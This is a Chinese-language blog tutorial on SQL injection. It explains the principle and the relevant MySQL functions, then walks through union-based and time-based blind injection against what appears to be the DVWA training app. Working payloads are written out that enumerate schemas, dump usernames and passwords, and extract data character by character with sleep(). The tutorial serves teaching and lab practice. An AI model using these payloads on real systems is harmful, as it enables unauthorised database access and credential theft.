SQL注入漏洞讲解

楠不理2024-10-092024-10-09

1、漏洞说明

1.1 漏洞原理

前端接收的SQL语句查询参数未经过过滤或过滤不严谨，导致攻击者拼接恶意参数到数据库直接执行。

1.2 前置知识

Mysql数据库注释方法：

MySQL查询语法：

  1. select 要查询的字段名 from 库名.表名
  2. select 要查询的字段名 from 库名.表名 where 以知条件字段名=’以知条件值’

MySQL常用函数：

  1. version() 数据库版本信息
  2. database() 数据库名称
  3. user() 系统用户和登录主机名
  4. length() 函数返回对象字符串长度
  5. substr(对象,最小为1的初始截取位置数,截取数) 函数截取字符串
  6. group_concat() 函数将所有信息回显到一行一列中
  7. sleep() 函数休眠n秒钟后再返回信息

MySQL探测列(字段)数：

  1. order by 法
    order by n ,每次运行 n+1 直到报错前，就有n列。

  2. union select 法

每次执行null数加1直到成功执行，成功时null数就是列数。

INFORMATION_SCHEMA数据库结构：

COLUMNS表：存储数据库、表、以及表中的字段，分别对应表中的字段为TABLE_SCHEMA字段，TABLE_NAME字段，COLUMN_NAME字段。

select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS limit 0,10;

2、漏洞复现

2.1 显注入

攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。

SQL注入流程：

1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序，确定输出点

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.获取数据

首先找到注入点，判断注入类型：

例如sql语句：select id from users where id = ‘参数变量’;

1
1’ #

输入数字型不报错，输入拼接字符型不报错，说明是字符型。

判断存在2个字段：

1 ‘ order by 2 #

显示报错位：

1 ‘ union select 1,2 #

查找库名：

1 ‘ union select 1,database() #

查找当前数据库中的表：

1 ‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

查找表users中的字段：

1 ‘ union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’ #

查找数据：

1 ‘ union select group_concat(user),group_concat(password) from users #

2.2 盲注入

相比于常规的SQL注入，他不会将返回具体的数据信息或语法信息，只会将服务器包装后的信息返回到页面中。
SQL盲注流程：

1.判断是否存在注入，注入的类型

2.猜解当前数据库名称

3.猜解数据库中的表名

4.猜解表中的字段名

5.获取表中的字段值

对传参没有进行任何检查和过滤，返回参数只有User ID exists in the database.和User ID is MISSING from the database.两种。

判断是否存在注入：

例如sql语句：select id from users where id = ‘参数变量’;

回显延迟：1’ and sleep(5) –
回显不延迟：1.1’ and sleep(5) –
sleep()函数可以带入数据库执行，由此判断存在盲注。

判断数据库库名长度：

1’ and if(length(database())=1,sleep(5),1) –

1’ and if(length(database())=4,sleep(5),1) –

通过修改length函数的等值，触发if条件，查看是否延时，就可以获取库名长度为4。

分割字符判断数据库库名：

1’ and if(substr(database(),1,1)=’a’,sleep(5),1) –

1’ and if(substr(database(),1,1)=’d’,sleep(5),1) –

1’ and if(substr(database(),2,1)=’v’,sleep(5),1) –

通过修改substr函数的值，触发if条件，查看是否延时，就可以获取库名为dvwa。
